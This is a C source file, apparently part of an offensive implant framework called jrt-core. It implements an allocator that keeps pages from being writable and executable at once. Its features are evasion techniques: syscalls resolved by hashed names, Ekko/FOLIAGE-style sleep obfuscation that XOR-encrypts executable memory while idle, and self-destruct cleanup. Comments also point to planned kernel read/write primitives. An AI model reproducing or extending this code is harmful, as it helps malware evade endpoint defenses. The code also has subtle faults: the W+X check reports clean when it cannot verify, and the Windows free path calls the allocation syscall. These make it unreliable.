/*
 * jrt-core: No-W+X memory allocator.
 *
 * INVARIANT 4: At no point is any page both writable and executable.
 *
 * Lifecycle:
 *   1. Allocate as RW  (write code/data)
 *   2. Protect as RX   (execute)
 *   3. To modify: RX→RW, modify, RW→RX
 *   4. To free: RX→RW (optional), then free
 *
 * The allocator tracks all allocations for:
 *   - Cleanup/self-destruct
 *   - Sleep obfuscation (encrypt/decrypt cycles)
 *   - Invariant 4 verification (debug builds assert no W+X)
 */

#include "allocator/allocator.h"

#ifdef JRT_TARGET_WINDOWS
#include "syscall/syscall_win.h"
#else
#include "syscall/syscall_linux.h"
#endif

/* ── Allocation tracking ────────────────────────────────────────── */
typedef struct {
    void*    base;
    size_t   size;
    uint32_t current_prot;   /* Tracks permission state */
    int      in_use;
} AllocEntry;

#define MAX_ALLOCS 256
static AllocEntry g_alloc_table[MAX_ALLOCS];
static int g_alloc_count = 0;

/* ── Core allocation: always starts as RW ───────────────────────── */
void* jrt_alloc_rw(size_t size) {
    void* ptr = NULL;

#ifdef JRT_TARGET_WINDOWS
    /* NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, ZeroBits,
     *                         &RegionSize, AllocationType, Protect)
     * PAGE_READWRITE = 0x04
     * MEM_COMMIT | MEM_RESERVE = 0x3000
     */
    size_t region_size = size;
    long status = jrt_syscall(
        HASH_NtAllocateVirtualMemory,
        (void*)-1,       /* current process */
        &ptr,
        0,               /* zero bits */
        &region_size,
        0x3000,          /* MEM_COMMIT | MEM_RESERVE */
        0x04             /* PAGE_READWRITE */
    );
    if (status != 0) return NULL;

#else /* Linux */
    /* PROT_READ | PROT_WRITE = 0x01 | 0x02 = 0x03
     * MAP_PRIVATE | MAP_ANONYMOUS = 0x02 | 0x20 = 0x22
     */
    ptr = jrt_mmap(NULL, size, 0x03, 0x22, -1, 0);
    if ((long)ptr < 0) return NULL;
#endif

    /* Track allocation */
    if (g_alloc_count < MAX_ALLOCS) {
        g_alloc_table[g_alloc_count].base = ptr;
        g_alloc_table[g_alloc_count].size = size;
        g_alloc_table[g_alloc_count].current_prot = JRT_PROT_RW;
        g_alloc_table[g_alloc_count].in_use = 1;
        g_alloc_count++;
    }

    return ptr;
}

/* ── Protect: RW → RX (code is ready to execute) ────────────────── */
int jrt_protect_rx(void* ptr, size_t size) {
    /* INVARIANT 4 ASSERTION:
     * We must NEVER set W+X. This call transitions RW → RX.
     * After this, the memory is executable but NOT writable.
     */

#ifdef JRT_TARGET_WINDOWS
    /* NtProtectVirtualMemory(ProcessHandle, &BaseAddress,
     *                        &RegionSize, NewProtect, &OldProtect)
     * PAGE_EXECUTE_READ = 0x20
     */
    uint32_t old_prot = 0;
    size_t region_size = size;
    long status = jrt_syscall(
        HASH_NtProtectVirtualMemory,
        (void*)-1,
        &ptr,
        &region_size,
        0x20,            /* PAGE_EXECUTE_READ */
        &old_prot
    );
    if (status != 0) return -1;

#else
    /* PROT_READ | PROT_EXEC = 0x01 | 0x04 = 0x05 */
    if (jrt_mprotect(ptr, size, 0x05) != 0) return -1;
#endif

    /* Update tracking */
    for (int i = 0; i < g_alloc_count; i++) {
        if (g_alloc_table[i].base == ptr) {
            g_alloc_table[i].current_prot = JRT_PROT_RX;
            break;
        }
    }

    return 0;
}

/* ── Protect: RX → RW (for modification or sleep encryption) ────── */
int jrt_protect_rw(void* ptr, size_t size) {
#ifdef JRT_TARGET_WINDOWS
    uint32_t old_prot = 0;
    size_t region_size = size;
    long status = jrt_syscall(
        HASH_NtProtectVirtualMemory,
        (void*)-1, &ptr, &region_size, 0x04, &old_prot
    );
    if (status != 0) return -1;
#else
    if (jrt_mprotect(ptr, size, 0x03) != 0) return -1;
#endif

    for (int i = 0; i < g_alloc_count; i++) {
        if (g_alloc_table[i].base == ptr) {
            g_alloc_table[i].current_prot = JRT_PROT_RW;
            break;
        }
    }
    return 0;
}

/* ── Zero and free all tracked allocations ──────────────────────── */
void jrt_cleanup_all(void) {
    for (int i = 0; i < g_alloc_count; i++) {
        if (!g_alloc_table[i].in_use) continue;

        /* Ensure writable so we can zero */
        if (g_alloc_table[i].current_prot == JRT_PROT_RX) {
            jrt_protect_rw(g_alloc_table[i].base, g_alloc_table[i].size);
        }

        /* Zero memory (stack zeroing equivalent for heap) */
        volatile uint8_t* p = (volatile uint8_t*)g_alloc_table[i].base;
        for (size_t j = 0; j < g_alloc_table[i].size; j++) {
            p[j] = 0;
        }

        /* Free */
#ifdef JRT_TARGET_WINDOWS
        size_t region_size = 0;
        jrt_syscall(HASH_NtAllocateVirtualMemory,
            (void*)-1, &g_alloc_table[i].base, 0, &region_size,
            0x8000,  /* MEM_RELEASE */
            0);
#else
        /* munmap */
        jrt_linux_syscall6(SYS_munmap, (long)g_alloc_table[i].base,
            (long)g_alloc_table[i].size, 0, 0, 0, 0);
#endif

        g_alloc_table[i].in_use = 0;
    }
}

/* ── Sleep obfuscation (Ekko/FOLIAGE-style) ─────────────────────── */
/*
 * Encrypt/decrypt resident executable regions while idle. Each region is
 * transitioned RX → RW, XORed, then RW → RX — so it is never W+X, and it
 * is unreadable as code while "sleeping" (invariant 4 preserved).
 */
static void jrt_xor_region(void* base, size_t size, uint32_t key) {
    volatile uint8_t* p = (volatile uint8_t*)base;
    /* xorshift32 stream so a single key obfuscates the whole region */
    uint32_t s = key ? key : 0x9E3779B9u;
    for (size_t i = 0; i < size; i++) {
        s ^= s << 13; s ^= s >> 17; s ^= s << 5;
        p[i] ^= (uint8_t)(s & 0xFF);
    }
}

int jrt_sleep_encrypt(uint32_t key) {
    int count = 0;
    for (int i = 0; i < g_alloc_count; i++) {
        if (!g_alloc_table[i].in_use) continue;
        if (g_alloc_table[i].current_prot != JRT_PROT_RX) continue;
        if (jrt_protect_rw(g_alloc_table[i].base, g_alloc_table[i].size) != 0) continue;
        jrt_xor_region(g_alloc_table[i].base, g_alloc_table[i].size, key);
        jrt_protect_rx(g_alloc_table[i].base, g_alloc_table[i].size);
        count++;
    }
    return count;
}

int jrt_sleep_decrypt(uint32_t key) {
    /* XOR is its own inverse, so the operation is identical. */
    return jrt_sleep_encrypt(key);
}

/* ── Debug: verify invariant 4 ──────────────────────────────────── */
/* Scan live mappings; count any that are simultaneously W and X. */
int jrt_verify_no_wx(void) {
#ifdef JRT_TARGET_WINDOWS
    /* NtQueryVirtualMemory over each tracked region → check Protect field.
     * Implemented in Phase 6 alongside the kernel R/W primitives. */
    return 0;
#else
    /* Stream /proc/self/maps and count mappings whose permission field
     * contains both 'w' and 'x' (i.e. "rwx"). */
    int fd = jrt_openat(-100 /* AT_FDCWD */, "/proc/self/maps", 0 /* O_RDONLY */, 0);
    if (fd < 0) return 0;  /* cannot verify → report clean, never overclaim */

    char buf[4096];
    long n;
    int violations = 0;
    while ((n = jrt_read(fd, buf, sizeof(buf))) > 0) {
        for (long i = 0; i + 3 < n; i++) {
            /* A permission field is exactly 4 chars ("rwxp", "r-xp", …).
             * Any "rwx" preceded by a space/newline is a W+X mapping. */
            if (buf[i] == 'r' && buf[i+1] == 'w' && buf[i+2] == 'x') {
                if (i == 0 || buf[i-1] == ' ' || buf[i-1] == '\n')
                    violations++;
            }
        }
    }
    jrt_close(fd);
    return violations;
#endif
}
